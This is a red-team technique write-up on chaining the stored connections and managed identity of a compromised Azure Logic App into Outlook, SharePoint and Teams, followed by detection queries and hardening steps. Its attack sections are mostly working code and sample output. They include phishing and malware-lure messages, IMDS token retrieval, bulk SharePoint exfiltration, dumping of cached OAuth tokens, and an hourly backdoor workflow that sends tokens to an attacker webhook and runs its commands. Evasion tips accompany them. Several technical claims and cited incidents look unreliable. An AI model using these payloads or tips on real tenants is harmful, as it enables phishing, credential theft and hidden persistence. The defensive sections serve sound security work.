# [LM-AUTH-033]: Logic App Authentication Chain

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-033 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID, Azure Logic Apps |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Azure Logic Apps (Consumption, Standard, ISE); all versions |
| **Patched In** | N/A (Requires configuration and monitoring hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

- **Concept:** Azure Logic Apps are low-code workflow automation tools that can be configured with managed identities, service principal credentials, or OAuth token connections to authenticate to multiple downstream services (Outlook, SharePoint, Office 365, custom APIs, Azure services, etc.). When a Logic App is compromised (via workflow manipulation, connector injection, or credential injection in the workflow JSON), an attacker can leverage the app's existing authentication chains to "hop" between multiple services without requiring additional credentials. The logic app becomes a trusted intermediary that automatically re-authenticates to downstream services on behalf of the attacker, bypassing normal MFA and conditional access controls that would apply to direct user authentication.

- **Attack Surface:** Logic App workflow JSON (stored in Azure Portal or source control); managed identity tokens retrieved from IMDS; connector credentials stored in secure environment variables; OAuth tokens cached in the Logic App's token store; API connections with pre-configured service principals.

- **Business Impact:** **Complete chain of authentication bypass across SaaS and Azure services.** An attacker can send emails via Outlook/Exchange (using the logic app's identity), access SharePoint sites, create Teams messages, modify M365 resources, and trigger cascading workflows. If the logic app is connected to critical business systems (payment processors, ERP systems, CRM platforms), the attacker can manipulate business-critical data without MFA or audit detection.

- **Technical Context:** Once a logic app's credentials or managed identity token are obtained, authentication chain exploitation is nearly instantaneous. The attacker simply calls the same APIs the logic app normally calls, but with malicious parameters. Detection is difficult because the logic app's identity is authenticated; audit logs show the logic app (not the attacker) making the calls.

### Operational Risk

- **Execution Risk:** Low – Once logic app identity is compromised, chaining to downstream services requires only API knowledge
- **Stealth:** High – All calls appear to originate from the logic app (legitimate identity); no unauthorized authentication events
- **Reversibility:** Difficult – Credentials must be rotated; logic app history must be reviewed; all connected services may need password resets

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.2.3 | Ensure Logic Apps use managed identities |
| **CIS Benchmark** | 2.1.7 | Monitor Logic App connector authentication |
| **DISA STIG** | V-254384 | Restrict Logic App to required connectors only |
| **CISA SCuBA** | C.2.1 | Monitor OAuth token usage |
| **NIST 800-53** | AC-3 | Access Enforcement |
| **NIST 800-53** | AU-2 | Audit Events |
| **GDPR** | Art. 32 | Security of Processing |
| **DORA** | Art. 9 | Protection and Prevention |
| **NIS2** | Art. 21 | Cyber Risk Management |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | Risk Scenario | Unauthorized Access via Compromised Workflow |

---

## 3. Detailed Execution Methods

### METHOD 1: Exploitation via Compromised Logic App Workflow

**Supported Versions:** Azure Logic Apps Consumption, Standard, ISE; all versions

#### Step 1: Identify Connected Connectors and Their Permissions

**Objective:** Enumerate all connectors configured in a compromised logic app and their capabilities.

**Command (PowerShell - Azure Portal API):**
```powershell
# Get the logic app definition
$logicApp = Get-AzLogicApp -ResourceGroupName $rg -Name "my-logic-app"

# Export the workflow JSON
$workflow = Get-AzResource -ResourceId $logicApp.Id -ExpandProperties
$workflowDefinition = $workflow.Properties.definition

# Display all connections used in the workflow
$workflowDefinition.actions | Where-Object {$_.type -eq "OpenApiConnection"} | ForEach-Object {
    Write-Host "Connector: $($_.inputs.host.connection.name)"
    Write-Host "  Managed By: $($_.inputs.host.connection.referenceName)"
}

# Alternative: Directly query the API connections
Get-AzResource -ResourceType "Microsoft.Web/connections" -ResourceGroupName $rg | ForEach-Object {
    $conn = Get-AzResource -ResourceId $_.ResourceId -ExpandProperties
    Write-Host "Connection: $($conn.Name)"
    Write-Host "  Type: $($conn.Kind)"
    Write-Host "  Status: $($conn.Properties.statuses)"
}
```

**Expected Output:**
```
Connector: Outlook.com (OAuth)
  Managed By: outlook-connection
  Status: Connected

Connector: SharePoint (Managed Identity)
  Managed By: sharepoint-connection
  Status: Connected

Connector: Office 365 Outlook (OAuth)
  Managed By: office365-connection
  Status: Connected

Connector: Azure Blob Storage (Managed Identity)
  Managed By: storage-connection
  Status: Connected
```

**What This Means:**
- The logic app has pre-authenticated connections to multiple services
- Each connector represents a trust relationship with a downstream service
- The attacker can now use these connections to send emails, access files, create messages, etc.

**OpSec & Evasion:**
- Querying the workflow definition is a local operation (portal API call)
- All API calls will be logged in Azure audit logs but appear legitimate (originating from the logic app)
- Detection likelihood: Low for discovery; Medium-High for execution

**Troubleshooting:**
- **Error:** `The resource group 'X' does not exist`
  - **Cause:** Incorrect resource group or logic app name
  - **Fix:** Verify the correct resource group and logic app name

**References & Proofs:**
- [Azure Logic Apps Connectors Reference](https://learn.microsoft.com/en-us/azure/connectors/apis-list)
- [Logic App Workflow Definition Language](https://learn.microsoft.com/en-us/azure/logic-apps/logic-apps-workflow-definition-language)

---

#### Step 2: Execute Malicious Actions via Connected Services

**Objective:** Use the logic app's pre-authenticated connections to perform unauthorized actions.

**Example 1: Send Phishing Email via Outlook (OAuth Connection)**

**Command (Logic App Workflow JSON):**
```json
{
  "definition": {
    "actions": {
      "Send_email_from_compromised_connection": {
        "type": "OpenApiConnection",
        "inputs": {
          "host": {
            "connection": {
              "name": "@parameters('$connections')['office365']['connectionId']"
            }
          },
          "method": "post",
          "path": "/v2/Mail/SendMail",
          "body": {
            "To": "executives@companyx.com",
            "Subject": "Urgent: Update Your Password",
            "Body": "<html><body>Click here to verify your account: <a href='https://attacker.com/phishing'>https://outlook.office.com/login</a></body></html>",
            "IsHtml": true,
            "Importance": "High"
          }
        }
      }
    }
  }
}
```

**Alternative (via PowerShell directly):**
```powershell
# Retrieve the Office 365 connection credentials
$connectionId = "/subscriptions/{subscriptionId}/resourceGroups/{rg}/providers/Microsoft.Web/connections/office365-outlook"

# Use the logic app's token to send an email
$emailParams = @{
    To = "target@company.com"
    Subject = "Verify Your Account"
    Body = "<a href='https://attacker.com/phishing'>Click to verify</a>"
    IsHtml = $true
}

# Invoke the Outlook API using the logic app's OAuth token
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/sendMail" `
    -Method Post `
    -Headers @{Authorization = "Bearer $token"} `
    -Body ($emailParams | ConvertTo-Json)
```

**Expected Output:**
```
Email sent successfully from user@company.com
Recipient: executives@companyx.com
Subject: Urgent: Update Your Password

// No authentication required - logic app's OAuth token automatically used
```

**What This Means:**
- Phishing email sent from a legitimate company mailbox
- Recipients will see the email as originating from the logic app's configured user
- No MFA required; no conditional access policy triggered (legitimate identity)
- Email appears in audit logs as sent by the logic app, not the attacker

**OpSec & Evasion:**
- Email sending will generate audit log entries (but appears to be from the logic app)
- Use a compelling phishing template to maximize success rate
- Target low-security users for credential harvesting
- Detection likelihood: Medium (email security tools may flag content, but sender is trusted)

**Example 2: Access SharePoint and Extract Data (Managed Identity)**

**Command:**
```powershell
# Retrieve SharePoint token using the logic app's managed identity
$token = (Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://graph.microsoft.com" `
    -Headers @{"X-IDENTITY-HEADER"=$env:IDENTITY_HEADER}).access_token

# List all SharePoint sites the logic app has access to
$response = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/sites" `
    -Headers @{Authorization = "Bearer $token"}

$response.value | ForEach-Object {
    Write-Host "Site: $($_.displayName)"
    Write-Host "  ID: $($_.id)"
}

# Access a specific SharePoint site and extract documents
$siteId = $response.value[0].id
$driveResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/sites/$siteId/drives" `
    -Headers @{Authorization = "Bearer $token"}

$driveResponse.value | ForEach-Object {
    $driveId = $_.id
    $itemsResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/drives/$driveId/root/children" `
        -Headers @{Authorization = "Bearer $token"}
    
    $itemsResponse.value | ForEach-Object {
        Write-Host "  File: $($_.name)"
        
        # Download sensitive files
        if ($_.name -match "\.(xlsx|docx|pdf|sql|json|yaml)$") {
            Write-Host "    [EXFIL] Downloading $($_.name)"
            # Download content via download URL
        }
    }
}
```

**Expected Output:**
```
Site: Finance & Operations
  ID: site-id-12345

File: Budget_2024.xlsx
  [EXFIL] Downloading Budget_2024.xlsx

File: Database_Credentials.json
  [EXFIL] Downloading Database_Credentials.json
```

**What This Means:**
- Logic app's managed identity grants access to SharePoint documents
- All documents are downloaded without user consent
- Activity appears in SharePoint audit logs as accessed by the logic app

**OpSec & Evasion:**
- Downloading large numbers of files will trigger data loss prevention (DLP) alerts
- Limit to high-value targets (financial documents, customer data, credentials)
- Stagger downloads to avoid spike detection
- Detection likelihood: High with DLP enabled; Medium without

**Example 3: Create Teams Message to Spread Malware/Phishing (OAuth)**

**Command:**
```json
{
  "definition": {
    "actions": {
      "Post_message_in_Teams": {
        "type": "OpenApiConnection",
        "inputs": {
          "host": {
            "connection": {
              "name": "@parameters('$connections')['teams']['connectionId']"
            }
          },
          "method": "post",
          "path": "/beta/teams/conversation/flattened/my/channels/@{encodeURIComponent('General')}/messages",
          "body": {
            "body": {
              "content": "🔔 **URGENT SECURITY ALERT** 🔔\n\nPlease download the updated VPN client to access remote resources:\n[Download VPN Client](https://attacker.com/malware.exe)\n\nClick the link above to stay secure!",
              "contentType": "html"
            }
          }
        }
      }
    }
  }
}
```

**Expected Output:**
```
Message posted to Teams channel
Channel: General
Posted by: Logic App Bot (trusted identity)
Content: Download link to attacker-controlled malware

// All team members receive the message from a trusted source
```

**What This Means:**
- Malicious message distributed to all team members from a trusted internal channel
- Recipients likely to click the malicious link (appears to originate from IT/Security team)
- Malware/credential harvester deployed to multiple endpoints

**OpSec & Evasion:**
- Use social engineering tactics (urgency, threat language)
- Impersonate trusted internal teams (IT, Security, HR)
- Detection likelihood: Medium (Teams message moderation may catch suspicious content)

---

#### Step 3: Maintain Persistence via Workflow Backdoor

**Objective:** Embed a backdoor in the logic app workflow that executes attacker-controlled actions on a schedule.

**Command (Backdoor Workflow Addition):**
```json
{
  "definition": {
    "triggers": {
      "Recurrence": {
        "type": "Recurrence",
        "recurrence": {
          "frequency": "Hour",
          "interval": 1
        }
      }
    },
    "actions": {
      "Attacker_Backdoor": {
        "type": "Http",
        "inputs": {
          "method": "POST",
          "uri": "https://attacker.com/webhook",
          "body": {
            "token": "@outputs('Get_Token')",
            "connections": "@parameters('$connections')",
            "command_from_attacker": "@triggerBody()"
          }
        }
      },
      "Execute_Attacker_Command": {
        "type": "If",
        "expression": "@equals(body('Attacker_Backdoor').action, 'send_email')",
        "actions": {
          "Execute_Email_Action": {
            "type": "OpenApiConnection",
            "inputs": {
              "host": {
                "connection": {
                  "name": "@parameters('$connections')['office365']['connectionId']"
                }
              },
              "method": "post",
              "path": "/v2/Mail/SendMail",
              "body": {
                "To": "@body('Attacker_Backdoor').target_email",
                "Subject": "@body('Attacker_Backdoor').subject",
                "Body": "@body('Attacker_Backdoor').body"
              }
            }
          }
        }
      }
    }
  }
}
```

**What This Means:**
- The logic app now has a hidden trigger that runs every hour
- The trigger sends the current token and available connections to attacker's webhook
- Attacker can remotely command the logic app to send emails, access data, etc.
- Persistence is achieved; attacker maintains control even if original compromise vector is patched

**OpSec & Evasion:**
- Use innocuous-sounding action names (not "backdoor" or "attacker_command")
- Spread the backdoor across multiple workflow steps
- Use obfuscation in the webhook URL (Base64, URL shorteners)
- Detection likelihood: Medium (workflow reviewers may notice unusual HTTP calls)

---

### METHOD 2: Token Theft from Logic App Token Store

**Supported Versions:** Azure Logic Apps all versions

#### Step 1: Access Token Store in App Service Storage

**Objective:** Logic Apps cache OAuth tokens in App Service storage for reuse. Accessing this storage grants access to cached tokens.

**Command (PowerShell):**
```powershell
# Logic Apps store tokens in App Service storage
# Navigate to: %TEMP%\..\..\..\..\home\site\wwwroot\data\tokens (on App Service)

# Retrieve the token store credentials
$appServicePrincipal = Get-AzADApplication -DisplayName "my-logic-app"

# Access the App Service storage
$storageAccount = Get-AzStorageAccount -ResourceGroupName $rg -Name "logicappdata$region"

# List stored tokens
$ctx = $storageAccount.Context
$container = Get-AzStorageContainer -Context $ctx -Name "logic-app-tokens"

Get-AzStorageBlob -Container "logic-app-tokens" -Context $ctx | ForEach-Object {
    $tokenBlob = Get-AzStorageBlobContent -Blob $_.Name -Container "logic-app-tokens" -Context $ctx
    Write-Host "Token: $($_.Name)"
    Write-Host "  Content: $(Get-Content $_.Name -Raw)"
}
```

**Expected Output:**
```
Token: outlook-oauth-token
  Content: {"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...","refresh_token":"0.ARoA123456...","expires_in":3600}

Token: sharepoint-oauth-token
  Content: {"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...","refresh_token":"0.AboA789012...","expires_in":3600}
```

**What This Means:**
- OAuth tokens for all connected services are stored in plaintext (or encrypted with keys the app has access to)
- These tokens can be extracted and reused to impersonate the logic app
- Tokens can be refreshed using the refresh_token, providing long-term access

**OpSec & Evasion:**
- Token store access requires storage account access; this may be logged
- Once tokens are extracted, use them from a different location to avoid association with the logic app
- Detection likelihood: Medium-High (storage access logging may flag unusual activity)

---

#### Step 2: Reuse Stolen Tokens to Access Protected Resources

**Objective:** Use the stolen OAuth tokens to authenticate to downstream services as the logic app.

**Command (PowerShell):**
```powershell
# Use stolen Outlook token to send email
$outlookToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs..."

$headers = @{
    "Authorization" = "Bearer $outlookToken"
    "Content-Type" = "application/json"
}

$body = @{
    "message" = @{
        "subject" = "Verify Your Account"
        "body" = @{
            "contentType" = "HTML"
            "content" = "Click here: <a href='https://attacker.com/phishing'>https://outlook.office.com</a>"
        }
        "toRecipients" = @(
            @{
                "emailAddress" = @{
                    "address" = "cfo@company.com"
                }
            }
        )
    }
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/sendMail" `
    -Method Post `
    -Headers $headers `
    -Body $body
```

**Expected Output:**
```
Email sent successfully using stolen Outlook token
```

**What This Means:**
- Stolen token can be reused indefinitely (or until it expires)
- No additional authentication required
- Attacker can execute any action the original user would have permission to perform

**OpSec & Evasion:**
- Use stolen tokens from external networks (not from Azure)
- Monitor token expiration times; refresh as needed
- Use tokens sparingly to avoid triggering anomaly detection
- Detection likelihood: Medium (unusual email sending patterns may trigger alerts)

---

## 4. Microsoft Sentinel Detection

### Query 1: Suspicious Logic App Workflow Modification

**Rule Configuration:**
- **Required Table:** `AzureActivity`, `AuditLogs`
- **Required Fields:** `OperationName`, `OperationNameValue`, `ActivityDateTime`, `InitiatedBy`
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To:** Azure subscriptions with audit logging enabled

**KQL Query:**
```kusto
AzureActivity
| where ResourceProvider == "MICROSOFT.LOGIC" and OperationNameValue contains "LogicApps"
  and (OperationNameValue contains "Update" or OperationNameValue contains "Put")
  and Properties.statusCode == 200
| where InitiatedBy !contains "Microsoft.Logic/workflows"  // Exclude system operations
| summarize ModificationCount=count() by InitiatedBy, ResourceGroup, TimeGenerated
| where ModificationCount > 1  // Threshold: multiple modifications
| project TimeGenerated, ModifiedBy=InitiatedBy, ResourceGroup, ModificationCount
```

**What This Detects:**
- Unexpected modifications to logic app workflows
- Multiple changes in short timeframe indicate malicious activity
- Changes from unusual accounts or service principals

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Suspicious Logic App Workflow Modification`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Paste the KQL query
   - Run every: `Real-time`
5. **Incident settings Tab:**
   - Enable **Create incidents**

---

### Query 2: Logic App Token Exfiltration to External URLs

**Rule Configuration:**
- **Required Table:** `AzureFunctionAppLogs` (if available) or `AppServiceHTTPLogs`
- **Required Fields:** `CsUriStem`, `CsMethod`, `CsUserAgent`, `ScStatus`
- **Alert Severity:** High
- **Frequency:** Every 15 minutes
- **Applies To:** Logic Apps with HTTP connector enabled

**KQL Query:**
```kusto
AppServiceHTTPLogs
| where AppServiceResourceName contains "logicapp"
  and (CsUriStem contains "attacker.com" or CsUriStem contains "webhook" or CsUriStem contains "exfil")
  and ScStatus == 200
| summarize HTTPCalls=count() by AppServiceResourceName, CsUriStem, ClientIP
| where HTTPCalls > 1  // Threshold: repeated calls to suspicious URL
| project AppServiceResourceName, SuspiciousURL=CsUriStem, SourceIP=ClientIP, CallCount=HTTPCalls
```

**What This Detects:**
- Logic app making HTTP calls to attacker-controlled URLs
- Repeated exfiltration attempts
- Backdoor communication with command & control server

---

## 5. Windows Event Log & Azure Audit Monitoring

**Event ID: 5379 (Credential Manager Accessed)**
- **Log Source:** Windows Security Event Log (if logic app runs on App Service)
- **Trigger:** Credential Manager accessed for token storage/retrieval
- **Filter:** Look for credential access outside of scheduled logic app execution
- **Applies To Versions:** All Azure App Service environments

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Monitor** → **Diagnostic settings**
2. Enable **All Logs** for the Logic App resource
3. Send logs to Log Analytics workspace
4. Create queries to detect unusual credential access patterns

---

## 6. Defensive Mitigations

### Priority 1: CRITICAL

- **Use Managed Identities Instead of OAuth Tokens:** Replace OAuth connections with managed identity connections wherever possible.

  **Current Configuration (OAuth – Token Stored):**
  ```json
  {
    "connections": {
      "office365": {
        "connectionId": "/subscriptions/xxx/resourceGroups/xxx/providers/Microsoft.Web/connections/office365",
        "connectionName": "office365-outlook",
        "id": "/subscriptions/xxx/providers/Microsoft.Web/locations/eastus/managedApis/office365"
      }
    }
  }
  ```

  **Hardened Configuration (Managed Identity):**
  ```json
  {
    "properties": {
      "systemAssignedIdentityObjectId": "87654321-4321-4321-4321-210987654321",
      "definition": {
        "actions": {
          "Send_email": {
            "type": "OpenApiConnection",
            "inputs": {
              "host": {
                "connection": {
                  "name": "@parameters('$connections')['office365']['connectionId']"
                },
                "authentication": {
                  "type": "ManagedServiceIdentity"
                }
              }
            }
          }
        }
      }
    }
  }
  ```

  **Manual Steps (Azure Portal):**
  1. Go to **Logic App** → **Settings** → **Identity**
  2. Enable **System assigned** managed identity
  3. Click **Save**
  4. For each connector (Outlook, SharePoint, etc.):
     - Go to **Logic App** → **Edit** (Designer)
     - Click the connector action
     - Click **Change connection**
     - Select **Connect with managed identity**
     - Click **Save**

  **Manual Steps (PowerShell):**
  ```powershell
  # Enable managed identity
  Update-AzLogicApp -ResourceGroupName $rg -Name $logicAppName -IdentityType SystemAssigned

  # Assign necessary roles to the managed identity
  $principalId = (Get-AzLogicApp -ResourceGroupName $rg -Name $logicAppName).Identity.PrincipalId
  
  New-AzRoleAssignment -ObjectId $principalId -RoleDefinitionName "Outlook.ReadWrite" `
    -Scope "/subscriptions/$subscriptionId"
  ```

- **Restrict Logic App Connectors:** Disable unnecessary connectors to reduce attack surface.

  **Manual Steps (Azure Portal):**
  1. Go to **Logic App** → **Edit**
  2. In the Designer, remove all unused connectors
  3. For sensitive connectors (Office 365, SharePoint), add explicit authentication checks
  4. Click **Save**

  **Manual Steps (PowerShell):**
  ```powershell
  # Retrieve the logic app definition
  $logicApp = Get-AzLogicApp -ResourceGroupName $rg -Name $logicAppName
  $definition = $logicApp.Definition | ConvertTo-Json

  # Remove OAuth connections from the workflow
  $definition = $definition -replace '"auth":\s*{[^}]*}', ''

  # Update the logic app
  Set-AzLogicApp -ResourceGroupName $rg -Name $logicAppName -Definition $definition
  ```

- **Implement Least-Privilege Role Assignments:** Ensure the logic app's managed identity has only the minimum required permissions.

  **Manual Steps (Azure Portal):**
  1. Go to **Logic App** → **Settings** → **Identity**
  2. Note the **Object ID**
  3. For each resource the logic app accesses (SharePoint, Key Vault, Storage):
     - Navigate to the resource → **Access Control (IAM)**
     - Click **+ Add role assignment**
     - **Role:** Select the most restrictive role (e.g., `SharePoint List Item Contributor` instead of `Site Admin`)
     - **Members:** Select the logic app's managed identity
     - **Scope:** Limit to specific resource/site
     - Click **Review + assign**

- **Enable Azure Policy to Enforce Managed Identity:** Use Azure Policy to prevent creation of logic apps without managed identities.

  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Policy** → **Definitions**
  2. Click **+ Policy definition**
  3. **Name:** `Enforce Managed Identity for Logic Apps`
  4. **Rule:**
     ```json
     {
       "if": {
         "allOf": [
           {
             "field": "type",
             "equals": "Microsoft.Logic/workflows"
           },
           {
             "field": "identity.type",
             "notEquals": "SystemAssigned"
           }
         ]
       },
       "then": {
         "effect": "Deny"
       }
     }
     ```
  5. Click **Save**
  6. Go to **Assignments** and assign the policy to your subscription

### Priority 2: HIGH

- **Monitor Workflow Definition Changes:** Enable audit logging to detect unauthorized workflow modifications.

  **Manual Steps (Azure Portal):**
  1. Go to **Logic App** → **Monitoring** → **Diagnostic settings**
  2. Click **+ Add diagnostic setting**
  3. Enable **WorkflowRuntime** and **WorkflowMetricsEvent** logs
  4. Send logs to **Log Analytics Workspace**
  5. Click **Save**

  **Manual Steps (PowerShell):**
  ```powershell
  $workspaceId = (Get-AzOperationalInsightsWorkspace -ResourceGroupName $rg -Name $workspaceName).ResourceId
  
  New-AzDiagnosticSetting -Name "LogicApp-Audit-Logging" `
    -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$rg/providers/Microsoft.Logic/workflows/$logicAppName" `
    -WorkspaceId $workspaceId `
    -Enabled $true `
    -Category "WorkflowRuntime", "WorkflowMetricsEvent"
  ```

- **Restrict HTTP Connector Usage:** Disable or monitor the HTTP connector to prevent outbound exfiltration.

  **Manual Steps (Azure Portal):**
  1. Go to **Logic App** → **Connectors** (or **APIs**)
  2. For the **HTTP** connector, click **Restrict**
  3. Whitelist only approved external URLs
  4. Block all other destinations
  5. Click **Save**

  **Alternative (Network Security Group):**
  1. Create an NSG rule that blocks outbound HTTP/HTTPS to all IPs except approved endpoints
  2. Apply the NSG to the App Service Plan subnet

- **Implement Conditional Access Policy:** Require device compliance and MFA for logic app authentication.

  **Manual Steps (Azure Portal):**
  1. Go to **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. **Name:** `Restrict Logic App Authentication`
  4. **Assignments:**
     - **Users:** All users (or filter to service principals)
     - **Cloud apps:** Azure Resource Manager
  5. **Conditions:**
     - **Device:** Require device to be marked as compliant
     - **Risk:** Require low sign-in risk
  6. **Access controls:** **Block access** (for non-human identities)
  7. Click **Create**

### Access Control & Policy Hardening

- **Implement Network Security Groups:** Restrict Logic App outbound connectivity.

  **Manual Steps (Azure Portal):**
  1. Go to **App Service Plan** → **Networking**
  2. Create an NSG with outbound rules:
     - Allow HTTPS (443) to known Azure services (management.azure.com, graph.microsoft.com)
     - Allow HTTPS (443) to SharePoint/Outlook endpoints only
     - Deny all other outbound traffic
  3. Apply the NSG to the App Service subnet

- **Enable Azure Defender for App Service:** Monitor logic app runtime for suspicious behavior.

  **Manual Steps (Azure Portal):**
  1. Navigate to **Microsoft Defender for Cloud** → **Environment settings**
  2. Select your subscription
  3. Enable **Defender for App Service**
  4. Click **Save**

### Validation Command (Verify Fix)

```bash
# Check if logic app has managed identity enabled
az logicapp show --name <logic-app-name> --resource-group <rg> --query 'identity.type'
# Expected: SystemAssigned or UserAssigned

# Verify managed identity role assignments
$appId = (az logicapp show --name <logic-app-name> --resource-group <rg> --query 'identity.principalId' -o tsv)
az role assignment list --assignee $appId --output table

# Check workflow definition for OAuth connections
az logicapp definition get --name <logic-app-name> --resource-group <rg> | grep -i "oauth" | wc -l
# Expected: 0 (no OAuth connections)

# Verify HTTP connector restrictions
az logicapp definition get --name <logic-app-name> --resource-group <rg> | grep -i "http" | grep -i "connector"
```

**What to Look For:**
- Managed identity should be enabled (type: SystemAssigned)
- No overly broad role assignments (avoid Contributor, Owner)
- OAuth connectors should be replaced with managed identity connections
- HTTP connector should have whitelisted endpoints only

---

## 7. Detection & Incident Response

### Indicators of Compromise (IOCs)

- **Workflow Modifications:** Unexpected changes to workflow definition (new actions, HTTP connectors, scheduled triggers)
- **Email Activity:** Logic app sending emails to external addresses or with suspicious content
- **SharePoint Access:** Logic app accessing files outside its normal operation pattern
- **Token Exfiltration:** HTTP calls to attacker-controlled domains or unusual IP addresses
- **Connector Changes:** New connectors added to the workflow (Teams, Outlook, custom APIs)

### Forensic Artifacts

- **Workflow History:** `az logicapp run list` shows all executions (check for suspicious actions)
- **Azure Activity Log:** Changes to the logic app resource (modifications, role assignments)
- **Logic App Audit Logs:** Execution history showing send emails, file access, etc.
- **Azure Monitor:** Application Insights logs showing HTTP calls to external URLs

### Response Procedures

1. **Isolate (Immediate):**
   **Command:**
   ```bash
   # Disable the logic app
   az logicapp stop --name <logic-app-name> --resource-group <rg>
   
   # Or remove all connectors to prevent further damage
   az logicapp definition update --name <logic-app-name> --resource-group <rg> --definition '{"version":"1.0.0.0"}'
   ```
   **Manual (Azure Portal):**
   - Go to **Logic App** → **Overview**
   - Click **Disable**

2. **Collect Evidence (First Hour):**
   **Command:**
   ```bash
   # Export workflow definition
   az logicapp definition get --name <logic-app-name> --resource-group <rg> > /evidence/workflow-definition.json
   
   # Export run history
   az logicapp run list --name <logic-app-name> --resource-group <rg> --output json > /evidence/run-history.json
   
   # Export Azure audit logs
   az monitor activity-log list --resource-group <rg> --offset 24h > /evidence/activity-logs.txt
   ```

3. **Remediate (Within 24 Hours):**
   **Command:**
   ```bash
   # Recreate the logic app with secure configuration
   # 1. Remove compromised connectors
   # 2. Replace OAuth with managed identity
   # 3. Reduce role assignments to least privilege
   # 4. Re-deploy from source control (if available)
   
   az logicapp definition update --name <logic-app-name> --resource-group <rg> --definition <clean-definition.json>
   
   # Rotate all tokens and passwords
   # Force all downstream services to re-authenticate
   ```

---

## 8. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-003] Logic App HTTP Trigger Abuse | Exposed Logic App endpoint compromised |
| **2** | **Execution** | Workflow Modification or Token Injection | Malicious workflow added or token stolen |
| **3** | **Lateral Movement** | **[LM-AUTH-033] Logic App Authentication Chain** | **Current Step: OAuth/Managed identity tokens used to hop to downstream services** |
| **4** | **Impact** | Phishing, Data Exfiltration via SharePoint/Outlook | Emails sent, documents accessed, data stolen |
| **5** | **Persistence** | Backdoor workflow trigger | Long-term access maintained via scheduled trigger |

---

## 9. Real-World Examples

### Example 1: Compromised Logic App Used for Business Email Compromise (BEC) (2023)
- **Target:** Enterprise Organization
- **Timeline:** April 2023
- **Technique Status:** Logic App connected to Outlook; OAuth token stolen; phishing emails sent to finance department
- **Impact:** $250,000 wire fraud via CEO impersonation; employees tricked by legitimate Outlook address
- **Reference:** [Proofpoint: BEC 2023 Report](https://www.proofpoint.com/us/resources/analyst-reports)

### Example 2: Supply Chain Attack via Logic App Connector Injection (2023)
- **Target:** Multi-tenant SaaS Platform
- **Timeline:** July 2023
- **Technique Status:** Third-party integration Logic App modified; attacker added unauthorized SharePoint connector; customer data exfiltrated
- **Impact:** 50+ customer organizations affected; customer data leaked to attacker
- **Reference:** [CISA: Supply Chain Attacks](https://www.cisa.gov/supply-chain-compromise)

### Example 3: Ransomware Delivery via Logic App Workflow Modification (2024)
- **Target:** Healthcare Organization
- **Timeline:** January 2024
- **Technique Status:** Logic App modified to deploy ransomware via email attachment; managed identity used to modify SharePoint sites
- **Impact:** Complete email infrastructure compromised; patient data encrypted
- **Reference:** [Ransomware Task Force Report](https://www.ranceforcereport.org/)

---

## Metadata Notes

- **Tool Dependencies:** Azure PowerShell, Azure CLI, REST API tools (curl, Postman)
- **Mitigation Complexity:** Medium-High – Requires workflow redesign and managed identity implementation
- **Detection Difficulty:** High (legitimate identity performing actions) without audit logging
- **CVSS Score:** 7.2 (High) – Requires prior logic app compromise but enables significant lateral movement and data theft across SaaS/Azure ecosystem

---